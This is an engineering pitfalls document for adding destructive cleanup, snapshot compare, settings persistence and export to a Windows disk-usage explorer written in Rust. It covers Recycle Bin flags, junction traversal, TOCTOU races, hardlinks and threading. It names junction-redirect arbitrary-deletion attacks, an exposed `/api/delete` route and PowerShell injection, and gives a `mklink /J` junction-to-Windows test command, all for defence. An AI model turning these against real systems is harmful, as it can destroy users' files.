# Pitfalls Research

**Domain:** Windows native disk-usage explorer with destructive cleanup (delete / move / Recycle Bin), brownfield extension of a zero-dependency raw-Win32 Rust app
**Researched:** 2026-05-22
**Confidence:** HIGH for destructive-operation pitfalls (verified against Microsoft Learn + MSRC); MEDIUM for snapshot / settings / scan-correctness (verified against TreeSize/SpaceObServer vendor docs + Microsoft NTFS docs); MEDIUM for UI threading (verified against Microsoft Learn message-queue docs).

This file is scoped to the *next* milestone — cleanup workflow, search, snapshot compare, settings persistence, new visualizations, HTML/XLSX export. The single highest-impact pitfall surface is destructive file operations driven from a multi-select UI; that section is intentionally long.

---

## Critical Pitfalls

### Pitfall 1: Permanent delete by default because the Recycle Bin flag wasn't set

**What goes wrong:**
The app shows a "Delete to Recycle Bin" button, the user clicks it, and the file is *permanently* gone — never reaches the Recycle Bin and is unrecoverable. The user's only recourse is file-recovery software (which usually fails on SSDs with TRIM). For a multi-select delete of thousands of files this is catastrophic and unrecoverable.

**Why it happens:**
Both Win32 shell delete APIs are dangerous by default:
- `SHFileOperationW` deletes **permanently** unless `FOF_ALLOWUNDO` is set in `SHFILEOPSTRUCT.fFlags`. Microsoft documents this explicitly: "If you want to simply delete a file and guarantee that it is not placed in the Recycle Bin, use DeleteFile." The corollary is that `SHFileOperation` without `FOF_ALLOWUNDO` is also a permanent delete.
- `IFileOperation::DeleteItems` recycles by default on Vista/7 but on Windows 8+ requires `FOFX_RECYCLEONDELETE` to be explicit. Microsoft recommends `IFileOperation` over `SHFileOperation` for new code.
- `std::fs::remove_file` / `remove_dir_all` (already used in the existing `/api/delete` handler at `src/main.rs:832-851`) bypass the Recycle Bin entirely — they call `DeleteFileW` / `RemoveDirectoryW`, which are unconditionally permanent.

The existing `/api/delete` route uses `fs::remove_dir_all`. Wiring this into the cleanup UI as-is would be a silent permanent-delete trap.

**How to avoid:**
- Default cleanup path MUST call `IFileOperation::DeleteItems` with `FOFX_RECYCLEONDELETE | FOFX_ADDUNDORECORD | FOF_NOCONFIRMATION | FOF_NOERRORUI` (suppress shell confirms — we own confirmation in our own dialog).
- Permanent delete is opt-in per action via a checkbox in the confirmation dialog, and uses the same `IFileOperation` instance with `FOFX_RECYCLEONDELETE` *omitted* — do not branch to `std::fs::remove_*` because that path can't be inspected by the progress sink and has different semantics for read-only files, ACL-denied files, and reparse points.
- Delete the legacy `/api/delete` route *or* gate it behind the same path validation and `IFileOperation` plumbing. The brownfield `/api/delete` is the single most dangerous bit of existing code (see `.planning/codebase/CONCERNS.md` "Known Bugs": "/api/delete accepts DELETE of any path with no confirmation on the server").
- Network-share and removable-drive deletes bypass the Recycle Bin regardless of flags. The confirmation dialog must detect this case (check the drive type via `GetDriveTypeW` on the path root) and warn: "Files on network/removable drives cannot be sent to the Recycle Bin — they will be permanently deleted."

**Warning signs:**
- A test delete of a single small file on `C:` does not produce a Recycle Bin entry.
- The confirmation dialog wording does not distinguish "Recycle" from "Permanent."
- Code review shows `remove_file` / `remove_dir_all` on a user-controlled path.

**Phase to address:** Cleanup phase, before any cleanup UI is exposed. This is the gate that blocks the whole feature surface.

---

### Pitfall 2: Junction / symlink traversal during recursive delete corrupts unrelated parts of the disk

**What goes wrong:**
The user selects a folder like `%LOCALAPPDATA%\Temp` and clicks Delete. The scanner previously walked through a junction inside that folder (e.g. a vendor app symlinked `Cache` to `C:\Users\<name>\Documents`), so the multi-select includes paths that *look* nested but actually live elsewhere. The recursive delete follows the junction and wipes the user's Documents folder. Worst case: a junction points to `C:\Windows\System32` (MSRC published 42 CVEs in 2024 in this exact class — "32 of 42 rely on attacker-created junctions to exploit the service").

**Why it happens:**
- Junctions and symlinks are *transparent* to the filesystem by design. A naive `WIN32_FIND_DATA` walk has no idea it crossed into another part of the disk.
- `std::fs::remove_dir_all` historically followed reparse points on Windows (this was changed for symlinks but folder junctions are still risky — and the behavior has shifted across Rust releases). Do not rely on Rust's default to be safe.
- The existing scanner has `follow_links` toggle and the codebase already flags the symlink-cycle risk (see CONCERNS.md: "Symlink cycle with follow_links=true can cause unbounded recursion"). The cleanup path inherits this surface.
- Junctions don't even require admin to create — *any* unprivileged user or app can plant one. Cleanup tools running with the user's full permissions can be redirected by anything in the user's profile.

**How to avoid:**
- During scan, tag every `NodeRecord` with a `is_reparse_point: bool` and `reparse_tag: u32` field, populated from `WIN32_FIND_DATA.dwReserved0` (`IO_REPARSE_TAG_MOUNT_POINT` for junctions, `IO_REPARSE_TAG_SYMLINK` for symlinks). Surface this in the UI with a distinct icon/badge.
- During delete, when encountering a directory with `FILE_ATTRIBUTE_REPARSE_POINT`, delete the *reparse point itself* — do not recurse through it. With `IFileOperation::DeleteItems` this is automatic if you pass the directory `IShellItem` (the shell knows). With manual `fs` calls it is *not* — `remove_dir` on a junction removes only the junction; `remove_dir_all` is the dangerous call.
- For multi-select deletes, deduplicate by canonical path *after* resolving reparse points (`GetFinalPathNameByHandleW` with `VOLUME_NAME_DOS`), so the user can't accidentally request the same physical file twice via different junction paths.
- Default `follow_links` to **false** in the cleanup-aware scanner. If `follow_links=true` is enabled (it isn't, by default), maintain a `BTreeSet<u128>` of file IDs (`nFileIndexHigh:nFileIndexLow` from `GetFileInformationByHandle`) visited during the walk, and refuse to descend into a directory whose file ID has already been seen — matches the existing CONCERNS.md recommendation but is now load-bearing because of delete.

**Warning signs:**
- A delete operation reports a "bytes reclaimed" number larger than the selected node's `size` field.
- Post-delete refresh shows unrelated parts of the tree have shrunk.
- A scanned folder reports more bytes than the volume itself contains.
- Tests with a deliberate junction (`mklink /J test C:\Windows`) inside a temp folder don't detect the reparse point in the tree.

**Phase to address:** Cleanup phase. The scan-side reparse-tag tagging is a prerequisite that must land in the same phase or earlier; it cannot be retrofitted after cleanup ships.

---

### Pitfall 3: TOCTOU race between scan snapshot and delete — wrong-path bug

**What goes wrong:**
User scans `C:\Projects`. While the user is reviewing, an unrelated process (or the user's own editor / sync client / build tool) renames `oldproject/` to `archived/` and creates a new `oldproject/` containing important active work. User selects "oldproject" in the stale scan view, clicks Delete, and obliterates the new project instead of the old one.

Alternatively: the user expands a multi-select on `node\_modules\` folders. By delete time, npm has rewritten parts of one. The recursive delete partially succeeds, leaving a corrupt half-deleted state.

**Why it happens:**
Disk-usage tools by nature operate on a **stale snapshot**. The `Vec<NodeRecord>` was built minutes (or hours) ago. Paths stored in the tree are strings, not handles, so they re-resolve on delete against whatever is at that path *now*. Multi-select makes this worse: a list of 500 paths held in the UI can drift in 500 different ways.

**How to avoid:**
- At delete time, **re-stat** every selected path before sending to `IFileOperation`. Compare `LastWriteTime`, `FileSize`, and (critically) the file ID (`nFileIndexHigh:nFileIndexLow`) against the scan record. If any mismatch, exclude that path and report it in the post-action summary as "skipped: changed since scan." Do not auto-delete a path whose identity has changed.
- The confirmation dialog must show the **top N largest paths** verbatim (full paths, not just leaf names), the **count**, and the **total bytes**. Showing only counts/bytes is the pattern that lets users approve "delete 500 files, 12 GB" without noticing it's the wrong 500.
- Disable the cleanup UI entirely while a scan refresh is in progress. The brownfield code already runs scans on a background thread and posts `WM_SCAN_DONE`; gate cleanup buttons on `scan_in_progress = false`.
- After every successful cleanup batch, auto-refresh the affected subtree (already on the requirements list as `CLEAN-05`) — this prevents the next batch from acting on now-doubly-stale data.

**Warning signs:**
- Post-action summary regularly shows large "bytes expected vs bytes reclaimed" deltas.
- Bug reports along the lines of "I deleted X and Y went missing."
- The cleanup UI is enabled during a scan.

**Phase to address:** Cleanup phase. Re-stat-before-delete is part of the cleanup pipeline, not a polish item.

---

### Pitfall 4: Long paths (>260 chars) and `\\?\` prefix break partway through a batch

**What goes wrong:**
Multi-select delete batch of 500 files. The first 480 succeed. Then a deeply-nested `node_modules\.bin\some-tool\node_modules\...\package.json` at 312 characters silently fails with `ERROR_PATH_NOT_FOUND`. The user sees "480 of 500 deleted, 20 errors" but the errors list is collapsed and the user doesn't notice. They re-run the scan, see the 20 stragglers, click Delete again, same result. Path length is invisible in the UI.

**Why it happens:**
- Classic `MAX_PATH` = 260 chars. Long-path support requires either the `\\?\` prefix on every path passed to Win32 APIs, *or* the `longPathAware` manifest setting *and* Windows 10 1607+ with the registry opt-in set (which is not the default).
- The existing scanner walks paths fine because `std::fs` and `FindFirstFileW` internally handle long paths in some cases, but `SHFileOperation` does **not** accept `\\?\` paths at all — it's documented to fail. `IFileOperation` works correctly with long paths via `SHCreateItemFromParsingName`.
- Rust `std::path::PathBuf` does not automatically prefix `\\?\`; that's the caller's job.

**How to avoid:**
- Use `IFileOperation` (not `SHFileOperation`) for the cleanup path. This is the same recommendation as Pitfall 1 but for a different reason.
- Convert each path to an `IShellItem` via `SHCreateItemFromParsingName(L"\\?\\" + path, ...)` before adding to the operation. The `\\?\` prefix here is harmless for short paths and required for long ones.
- Add a manifest entry `<ws:longPathAware>true</ws:longPathAware>` to the executable so the rest of the app (file dialogs, the existing scanner, the new search feature) handles long paths consistently.
- The post-action summary dialog must list per-path errors in a scrollable view with a "Copy to clipboard" button. Burying errors is what makes this pitfall chronic.

**Warning signs:**
- "Bytes reclaimed" consistently less than "bytes expected" for `node_modules`, `.git`, or deeply nested build-output trees.
- `ERROR_PATH_NOT_FOUND` or `ERROR_FILENAME_EXCED_RANGE` in the error log.
- Searching for files inside the app fails to find files visible in Explorer.

**Phase to address:** Cleanup phase (for the API choice) plus a one-time manifest update in any early phase that touches packaging.

---

### Pitfall 5: Hardlink double-count makes the "bytes reclaimed" estimate a lie

**What goes wrong:**
On a developer machine, two Git worktrees use hardlinks for `objects/pack/*.pack`. Or a Docker layer cache hardlinks images. Or `winsxs` (Windows Component Store) hardlinks system DLLs heavily. The scanner reports each hardlink as if it has its own bytes. The UI says "selecting these 5 packs will reclaim 4.8 GB," the user deletes them, and only ~960 MB is actually freed — because each pack was the same physical data shared with four other hardlinks the user *didn't* delete.

Users notice immediately ("the disk-free meter didn't move") and lose trust in every other number the tool shows.

**Why it happens:**
The existing scanner sums `metadata.len()` per `NodeRecord` with no hardlink awareness. NTFS records the file *content* once and each hardlink is just another name; deleting one name doesn't free the bytes until the last name is gone. TreeSize and SpaceObServer both default this feature **off** because of scan cost ("querying the hardlinks takes some time"), and both expose it as an explicit toggle.

**How to avoid:**
- Add a `hardlink_aware` scan option (default off for parity with existing perf). When on, during `scan_directory_job` call `GetFileInformationByHandle` on each candidate file (only when `nNumberOfLinks > 1`, which is cheap to filter on after the initial `FindFirstFile` if the attributes flag is available); record `(volume_serial, file_index_u64)` as the unique ID.
- Track unique file IDs in a per-scan `HashSet<(u32, u64)>`. When aggregating sizes (`aggregate_nodes`), count each file's bytes once per unique ID. Files seen more than once still appear as `NodeRecord`s in the tree (the names exist) but contribute to size only on first sighting (or per a "primary instance" policy).
- For cleanup, the confirmation dialog computes "bytes that will actually be freed" by counting the *last-remaining-name* of each file ID in the selection — i.e., if you select 3 of 4 hardlinks to the same file, zero bytes will be freed.
- Display a small badge on hardlinked files in the tree and a tooltip showing the other names.

**Warning signs:**
- A folder reports more bytes than the volume's total used space.
- `winsxs`, `.git`, Docker, or virtual-machine snapshot folders show enormous sizes.
- Post-delete free-space delta is consistently less than the reported "bytes reclaimed."

**Phase to address:** Scan-engine phase (the data has to be in `NodeRecord` before cleanup can use it). Default off to preserve existing scan throughput; the cleanup confirmation dialog can prompt to enable it when the user is about to delete files with `nNumberOfLinks > 1`.

---

### Pitfall 6: Path normalization mismatch breaks snapshot diff

**What goes wrong:**
User scans `C:\Projects` on Monday. On Tuesday they scan `c:\projects\` (capital `C` in Explorer's drive picker last time, lowercase now; trailing slash from a different code path; or 8.3 short name `PROJEC~1`). The snapshot compare reports "everything was deleted, everything was created" — every node looks different because the string keys don't match.

Worse case: the user scanned `C:\Users\Dan\Documents` on Monday, then upgraded their drive and the same content is now at `D:\Users\Dan\Documents`. A naive compare shows 100% churn.

**Why it happens:**
NTFS is **case-preserving but case-insensitive by default**. Paths that differ only in case refer to the same file. But string compare on raw paths is case-sensitive, so `Projects` ≠ `projects` to the diff logic even though the filesystem treats them as identical.

Other normalization landmines:
- Trailing slash: `C:\foo` vs `C:\foo\`
- Forward vs backslash: `C:/foo` vs `C:\foo`
- 8.3 short names: `PROGRA~1` vs `Program Files`
- Extended path prefix: `\\?\C:\foo` vs `C:\foo`
- UNC vs drive-letter form for mapped drives: `\\server\share\foo` vs `Z:\foo`
- Junction/symlink resolution: scan A walked through a junction, scan B didn't

**How to avoid:**
- Normalize every stored path at scan time before persistence: `GetFullPathNameW` to canonicalize (drive letter case, `..`/`.` resolution, slash direction), then lowercase the path for comparison purposes while preserving the original casing for display. Store both `display_path` and `compare_key`.
- For comparisons, key on **relative path from scan root**, not absolute path. The drive-letter-shift case (`C:\Users\Dan` → `D:\Users\Dan`) then survives because the relative parts match. Snapshot metadata records the original scan-root path separately.
- Detect 8.3 short names with `GetLongPathNameW` and canonicalize to long form.
- For files where it matters (large/important files in the compare), supplement path-based identity with file ID (`(volume_serial, file_index_u64)`) — same trick as the hardlink case. A path can change but the file ID survives a rename.
- Document the compare semantics: "Snapshot compare uses paths relative to the scan root, case-insensitive, with `..` resolved." Users will hit edge cases; they need to be able to understand them.

**Warning signs:**
- Diff reports >90% churn when the user knows nothing meaningful changed.
- Same file appears as both "added" and "removed" with slightly different paths.
- Files in `Program Files` show up as fully-deleted-then-re-added.

**Phase to address:** Snapshot phase. Path normalization is foundational — every other snapshot feature (delta, top-growers, history list) depends on it.

---

### Pitfall 7: Concurrent settings writes corrupt `%APPDATA%\FileTree\settings.json`

**What goes wrong:**
User launches FileTree from a pinned shortcut, then accidentally double-clicks the .exe. Two instances run. Both write to `%APPDATA%\FileTree\settings.json` on shutdown. The second writer wins, overwriting the first instance's column-width and bookmark changes. Or worse: both write simultaneously, producing a half-truncated file that fails to parse on next launch — and because the app is hand-rolling JSON, the parse error is generic and the file gets silently replaced with defaults, losing all saved bookmarks, snapshot history pointers, and last-path memory.

**Why it happens:**
- The existing codebase has zero dependencies and rolls its own JSON serialization. Hand-rolled parsers tend to be all-or-nothing; partial reads (which happen when one process writes while another reads) produce garbage. The codebase already notes the JSON serializer doesn't handle surrogate pairs correctly (ARCHITECTURE.md "Anti-Patterns").
- `File::create` + `write_all` is **not atomic** — a crash or concurrent write mid-flush leaves a corrupt file.
- No file locking is used.
- `serde_json`-style robustness is not present (and adding `serde` is a Key Decision under the zero-dep posture).

**How to avoid:**
- **Atomic write pattern**: write to `settings.json.tmp` in the same directory, `flush()`, then `fs::rename` (atomic on NTFS for same-volume renames) to `settings.json`. Never write `settings.json` directly. This is one of those patterns that costs ten lines and prevents permanent data loss.
- **Single-instance guard**: on startup, create a named mutex via `CreateMutexW(L"Local\\FileTreeSingleton")` and check `GetLastError() == ERROR_ALREADY_EXISTS`. If a previous instance exists, either focus its window via `FindWindowW` + `SetForegroundWindow` and exit, or warn the user and refuse to launch (don't try to merge settings — that path lies madness).
- **Schema version**: top of `settings.json` includes `"schema_version": 1`. Reader on startup: if version is *higher* than what the binary knows, do not touch the file — log a warning, run with defaults in-memory, and never write back. This prevents downgrade-corruption (run new build, save, then run old build, save — old build truncates new fields). Bump the version on every backwards-incompatible change.
- **Backups**: before overwriting `settings.json`, rotate the prior version to `settings.json.bak`. Single file, no history needed. Trivial recovery if a write goes wrong.
- **Defensive read**: if parse fails, do *not* delete the file — rename it to `settings.json.broken-<timestamp>` and run with defaults. Users can recover manually; deletion is unrecoverable.

**Warning signs:**
- Users report "my bookmarks disappeared."
- `settings.json` is occasionally 0 bytes after a crash.
- The "last opened path" resets to default on launch.

**Phase to address:** Settings persistence phase. The atomic-write + schema-version pattern must land with the first write, not be retrofitted.

---

### Pitfall 8: Win32 message loop blocks because cleanup runs on the UI thread

**What goes wrong:**
User selects 50,000 files in the duplicates tab and clicks Delete. The cleanup handler calls into `IFileOperation::PerformOperations` directly from the `WM_COMMAND` handler. The UI freezes for 20 minutes. Windows shows "FileTree (Not Responding)." Eventually the user clicks the close box, Windows offers to force-quit, the user accepts, and the half-finished delete is interrupted leaving the disk in an inconsistent state.

**Why it happens:**
The existing desktop module's message loop is single-threaded (architectural constraint, ARCHITECTURE.md). Any handler that blocks the loop freezes the app. The existing scan path already does this right — it spawns a background thread and posts `WM_SCAN_DONE` / `WM_SCAN_PROGRESS`. Cleanup must follow the same pattern, but the temptation to "just inline it because the user clicked the button" is strong.

Also: `IFileOperation` requires STA (`COINIT_APARTMENTTHREADED`). The desktop already uses STA on the UI thread (correct), but the worker thread that runs `PerformOperations` must *also* initialize STA — not MTA. And the worker's message queue must be force-created with `PeekMessage` before the main thread starts posting to it, otherwise `PostThreadMessage` from the UI silently fails.

**How to avoid:**
- Cleanup runs on a dedicated background thread, mirroring the existing scan pattern. The thread:
  1. Calls `CoInitializeEx(NULL, COINIT_APARTMENTTHREADED)` (STA).
  2. Calls `PeekMessage(&msg, NULL, WM_USER, WM_USER, PM_NOREMOVE)` immediately to force-create its thread message queue. This is the standard fix for the "first PostThreadMessage fails silently" bug.
  3. Creates the `IFileOperation`, advises an `IFileOperationProgressSink` implementation.
  4. The sink's `PreDeleteItem` / `PostDeleteItem` / `UpdateProgress` callbacks `PostMessage` (not `SendMessage` — `SendMessage` cross-thread blocks and can deadlock with COM's STA pump) custom `WM_APP_CLEANUP_PROGRESS` / `WM_APP_CLEANUP_DONE` messages to the main HWND.
  5. Calls `PerformOperations()` (blocks on the worker, but the UI thread keeps pumping).
  6. Releases COM objects, `CoUninitialize`, exits.
- LPARAM payloads for progress messages must be **heap-allocated** (`Box::into_raw` in Rust). The UI WndProc is responsible for `Box::from_raw` to free. Stack pointers via `PostMessage` produce use-after-free crashes — the worker stack frame returns before the UI handles the message.
- Use the existing custom message numbering convention (`WM_APP+N`) to stay consistent with `WM_SCAN_DONE`.
- For cancel, expose a `Arc<AtomicBool>` cancel flag (same pattern as scan). The sink's `PreDeleteItem` callback checks the flag and returns `E_ABORT`; `IFileOperation` honors this and stops the batch.
- Disable the Delete button while a cleanup is in flight. (Inadvertent double-click → double-delete confirmation → undefined behavior.)

**Warning signs:**
- "Not Responding" appears during delete or move operations.
- The progress bar updates only at the end (or not at all).
- `PostThreadMessage` returns 0 and `GetLastError()` returns `ERROR_INVALID_THREAD_ID` on the first message.

**Phase to address:** Cleanup phase. This pattern is non-negotiable for any I/O-bound feature; later phases (XLSX export, search, snapshot scan) should follow the same template.

---

### Pitfall 9: Multi-select state goes stale after scan refresh and selects wrong nodes

**What goes wrong:**
User selects 200 items, clicks Refresh (or auto-refresh fires after a delete), and the underlying `Vec<NodeRecord>` is rebuilt with different IDs. The UI still holds 200 selected `usize` indices, but those indices now point to different nodes — or to nodes that no longer exist. The next "Delete selected" acts on whatever happens to be at those indices, which is whatever now occupies that slot in the new vector. This is a worst-case wrong-path bug delivered through the multi-select UI.

**Why it happens:**
The existing architecture (ARCHITECTURE.md) uses `Vec<NodeRecord>` with `id: usize` as the position in the vector and parent/child relationships encoded as integer indices. Indices are stable *within* a scan but completely unstable *across* scans because the BFS order can vary with thread scheduling. The desktop module's `DesktopState` holds selection by ID; nothing invalidates the selection when `current_scan` is replaced.

**How to avoid:**
- Selection state holds a **stable identity**, not the `usize` ID. Options:
  - Full path string (works always, large memory cost for big selections — acceptable).
  - `(volume_serial, file_index_u64)` from `GetFileInformationByHandle` (more reliable across renames, requires the hardlink-aware scan path).
- On scan completion (`WM_SCAN_DONE` handler), rebuild the selection by resolving stored identities against the new tree. Drop identities that no longer resolve and report the count to the user ("12 of 200 selected items no longer exist after refresh").
- Disable cleanup actions during scan/refresh, as in Pitfall 3.
- For very large selections, keep the identity store as a `HashSet<u64>` keyed on a hash of the path; resolve incrementally.

**Warning signs:**
- After a refresh, the selection visually points to different rows than the user selected.
- A delete after a refresh removes files the user didn't select.
- Selection count jumps up or down across refreshes inexplicably.

**Phase to address:** Cleanup phase + multi-select phase (these likely land together). Must be designed in from the first multi-select prototype; retrofitting once selection state is baked in is painful.

---

### Pitfall 10: Antivirus and Windows Defender silently corrupt scans / cleanup

**What goes wrong:**
Symptoms vary and are maddening to debug:
- Scans of `C:\` are 10× slower than the same scan on a machine with realtime AV off (every file read triggers a scan).
- A delete batch fails with `ERROR_SHARING_VIOLATION` because Defender has the file open.
- A search over a freshly-scanned tree finds files but a follow-up `IFileOperation` can't open them because they were just quarantined.
- Network-share scans hang because the AV is doing per-file lookups against a cloud reputation service.
- Sparse VHDX/VHD files get fully expanded when read for hashing, ballooning the apparent disk usage (some AVs touch every byte to scan).

Users will report these as "FileTree is slow" or "FileTree corrupts my files" with no awareness AV is involved.

**Why it happens:**
On-access AV scanners intercept every `CreateFile`, `ReadFile`, `WriteFile`, and `DeleteFile` call. The existing FNV-1a duplicate hash already reads files in full (CONCERNS.md flags this as a perf issue); for cleanup, every `IFileOperation::DeleteItems` triggers AV inspection too. Network shares amplify this 10-100x.

**How to avoid:**
- For hashing in duplicates (existing code, plus future search-by-hash if added): hash only the first 4 KB + last 4 KB + size as a pre-filter; full-file hash only when those three match. Cuts AV load by ~99% on duplicate-candidate files.
- For status bar: show files-per-second and MB/s; a tanked rate is the user-visible signal that something (AV, network, slow drive) is in play.
- For network drives: detect drive type via `GetDriveTypeW`; warn the user before scanning a `DRIVE_REMOTE` path that scans will be slow and that the Recycle Bin will not be used. Default to a different scan threading model (fewer threads — network shares choke on parallel reads).
- For sharing-violation errors during delete: don't fail the whole batch. Skip the offending file, record it, and continue. The post-action summary lists "Skipped due to in-use file" so the user can retry after the holding process exits.
- Document an "if scans are slow" troubleshooting note: add the FileTree.exe to AV exclusions, scan with the AV temporarily paused, etc. Do *not* recommend disabling AV.

**Warning signs:**
- Scan throughput is < 1000 files/sec on local SSD.
- Many `ERROR_SHARING_VIOLATION` errors during delete.
- VM disk image files dramatically bloat after a duplicate-scan run.
- Bug reports along the lines of "files disappeared after I scanned" (they were quarantined).

**Phase to address:** Search and cleanup phases (the symptoms compound there). The pre-filter optimization should land before any new feature reads files in bulk.

---

## Technical Debt Patterns

Shortcuts that look reasonable but bite later.

| Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
|----------|-------------------|----------------|-----------------|
| Use `std::fs::remove_dir_all` instead of `IFileOperation` because "it works" | One-line implementation; no COM plumbing | No Recycle Bin support; follows reparse points on older Rust versions; no progress sink; no per-item error reporting; no shell extension integration | **Never** for user-facing cleanup. Acceptable only for app-managed temp dirs the user never sees. |
| Show progress only at start and end of cleanup | Skip the `IFileOperationProgressSink` implementation work | User can't tell if the app is hung; can't cancel mid-batch; trust collapses on long deletes | Acceptable for batches < ~100 items and < ~10 MB total, with a hard cap that escalates to progress UI above. |
| Keep selection as `Vec<usize>` indices into the node vector | Trivial; one line of code | Wrong-path bug after any scan refresh (Pitfall 9) | Never, once refresh exists. |
| Write `settings.json` directly without atomic-rename | Three lines instead of ten | Permanent loss of user settings on crash or concurrent instance | Never. The cost difference is negligible. |
| Hand-roll XLSX export "because the codebase is zero-dep" | Stays consistent with the zero-dep posture | XLSX is a zip of XML files with namespace minefields; bugs in your zip output produce files Excel silently corrupts. CSV export of the same data is fine and is the standard fallback. | Acceptable if XLSX is implemented via the OpenXML SDK-equivalent minimal subset (only the cells/sheets you actually emit) **and** tested across Excel 2016/2019/365/Online. Otherwise, document XLSX as "out of scope, use CSV." |
| Cache scan results across "Refresh" by reusing the existing `Vec<NodeRecord>` for unchanged subtrees | Faster refresh | Stale data in cached subtrees; subtle wrong-path bugs in cleanup that operates on cached records; cache-invalidation complexity outweighs the saving | Never until proven necessary by profiling. Full re-scan is the simple, correct default. |
| Allow the existing `/api/delete` route to remain unchanged when wiring up cleanup UI | Zero work on the server side | Anyone (curl, malicious browser tab, future port-exposure) can permanently delete any user-readable file with one HTTP GET | Never. Either remove the route, or gate it behind path validation + the same confirmation pipeline as the desktop. |
| Skip the schema-version field in `settings.json` because v1 has no migration to do | Tiny code saving | Downgrade run after upgrade silently destroys new settings; future migrations have nothing to anchor on | Never. The version field costs 4 bytes. |

---

## Integration Gotchas

Common mistakes connecting to the OS / Win32 surfaces this milestone touches.

| Integration | Common Mistake | Correct Approach |
|-------------|----------------|------------------|
| `IFileOperation` COM | Initialize COM as MTA (`COINIT_MULTITHREADED`) on the worker thread | `IFileOperation` requires STA. Use `COINIT_APARTMENTTHREADED`. For MTA you'd have to fall back to legacy `SHFileOperation`. |
| `IFileOperation` COM | Forget to `SetOperationFlags` and inherit the defaults | Set `FOFX_RECYCLEONDELETE \| FOFX_ADDUNDORECORD \| FOF_NOCONFIRMATION \| FOF_NOERRORUI \| FOFX_EARLYFAILURE` explicitly. Do not assume defaults. |
| `IFileOperation` COM | Check only the `HRESULT` from `PerformOperations` | Also call `GetAnyOperationsAborted()`. `S_OK` + `aborted == TRUE` means the user cancelled, not that the work happened. |
| Shell items | Use `SHCreateItemFromParsingName` with a path that lacks `\\?\` prefix on long paths | Always prefix with `\\?\` for parsing-name calls if the path exceeds 248 chars (the safe directory limit). Harmless on short paths. |
| Win32 message queue | Worker thread `PostThreadMessage` from UI fails before worker pumps | Worker calls `PeekMessage(&msg, NULL, WM_USER, WM_USER, PM_NOREMOVE)` first to force-create its queue, then `SetEvent` to signal readiness. |
| Win32 message queue | Cross-thread `SendMessage` from worker to UI | Use `PostMessage` only. `SendMessage` blocks the worker and can deadlock with COM apartment pumping. |
| Win32 message data | Pass stack pointers via `LPARAM` to `PostMessage` | Heap-allocate (`Box::into_raw` in Rust); receiver `Box::from_raw` to free. Document the ownership transfer in code comments. |
| `GetFileInformationByHandle` | Open the file with default access (which needs `GENERIC_READ`) just to get the file ID | Open with `FILE_FLAG_BACKUP_SEMANTICS` + access `0` (no read/write needed for metadata) + `FILE_FLAG_OPEN_REPARSE_POINT` (to avoid following the link). Works without admin and without touching the file. |
| Shell context menu | Call `IContextMenu::InvokeCommand` from the worker thread | Must be on the UI thread (the menu was created on the UI thread). The existing codebase does this correctly; new "right-click on multi-select" menus must follow the same constraint. |
| Recycle Bin restore | Try to programmatically restore a file from `$Recycle.Bin` by file path | The path is mangled (`$R<8 random chars>`). Use `IShellFolder2` on the `CSIDL_BITBUCKET` folder and locate by `SHGDN_FORPARSING` display name, or just open the shell Recycle Bin UI for the user (existing pattern). |
| HTML report export | Embed user-controlled paths into HTML with raw `push_str` | HTML-escape every path before injection (`<`, `>`, `&`, `"`, `'`). Filenames can contain these characters (e.g., `<tag>.html`). XSS in a "personal" tool is still real if the report is shared. |
| XLSX export | Emit dates and large numbers as strings | Use proper OOXML number / date types so Excel doesn't autoformat "12345678901234" into scientific notation, or interpret `5/6/2026` as a date depending on locale. |
| Win32 high-DPI | Hard-code pixel sizes for controls and treemap tiles | Query `GetDpiForWindow` and scale. The existing desktop code is probably DPI-aware already (Dwmapi is in the FFI surface); verify before adding new visualizations. |

---

## Performance Traps

| Trap | Symptoms | Prevention | When It Breaks |
|------|----------|------------|----------------|
| Full FNV-1a hash on every duplicate candidate | Multi-minute UI stalls; high disk I/O during duplicate scan | Pre-filter on `(size, first 4KB, last 4KB)`; full-hash only on three-way match | Already breaks at ~10 GB of candidates per CONCERNS.md "fnv1a_file reads with no size cap" |
| `IFileOperation` per single item in a multi-select batch | Slow deletes; each call has COM + shell-extension overhead | Batch all selections into one `IFileOperation` via repeated `DeleteItems`; call `PerformOperations` once | Breaks around 100+ items; catastrophic at 10,000+ |
| `WM_PAINT` re-renders all rows on every selection change | UI feels sluggish during rubber-band select | Invalidate only the rows whose selection state changed, not the whole list rect | Breaks at ~1000 visible rows (existing code already paints all rows; getting worse as new tabs land) |
| Search filter recomputes visibility for every node on every keystroke | Typing in search lags noticeably | Debounce input (~150 ms); cache results for the previous prefix and refine incrementally | Existing problem per CONCERNS.md "makeVisibilityPredicate" — gets worse with new search box |
| Snapshot diff rebuilds the entire old-vs-new tree on every comparison | Slow snapshot view for large scans | Diff once on snapshot load; cache the result; render incrementally | Breaks at ~100k nodes diff vs ~100k nodes |
| XLSX export holds the full tree in memory as XML strings while building the zip | OOM on 10M-node scans | Stream rows directly to the zip writer; flush sheets as they finish | Breaks at ~1M rows (Excel itself caps at 1,048,576 rows per sheet — chunk to multiple sheets at >900k anyway) |
| HTML report inlines all node data as one giant `<script>` JSON blob | Browser tab hangs on open; 200+ MB HTML files | Cap inlined data to top-N nodes (e.g., 5000); link to CSV for the full dataset | Breaks at ~50k nodes |
| Settings file reads on every config get/set | Frequent disk I/O; loses to AV scanning | Load once at startup into memory; write on shutdown (and on every cleanup checkpoint for safety) | Negligible at low frequencies; matters if settings becomes a hot path |
| Scanning a network drive with the default thread count | Network share unresponsive; scan takes hours | Detect `DRIVE_REMOTE`; clamp threads to 2-4; warn user | Always, on any remote drive |

---

## Security Mistakes

| Mistake | Risk | Prevention |
|---------|------|------------|
| Leave `/api/delete` in serve mode without path-prefix validation | Any process that can reach loopback (other apps, malicious browser tabs, accidentally-exposed port) can permanently delete arbitrary user files | Validate canonical resolved path starts with `state.initial_path`; add a per-launch random URL token; require POST + token. Or delete the endpoint entirely if desktop is the only cleanup surface. (CONCERNS.md flags this explicitly.) |
| Run cleanup while a service / scheduled task triggers FileTree as a different user | Junction-redirect attack — user plants a junction in a folder the privileged FileTree later cleans up; gets arbitrary file deletion as SYSTEM | Document that FileTree runs as the *current user* only, never as a service. Refuse to launch if running as SYSTEM (`OpenProcessToken` + `GetTokenInformation(TokenUser)`, compare to well-known `LocalSystem` SID). |
| PowerShell injection in `/api/properties` (existing) extended to cleanup | Path with backtick / dollar / quote characters escapes to arbitrary command execution | Replace PS interpolation with direct `SHObjectProperties` shell API. Already flagged in CONCERNS.md; cleanup must not extend this pattern. |
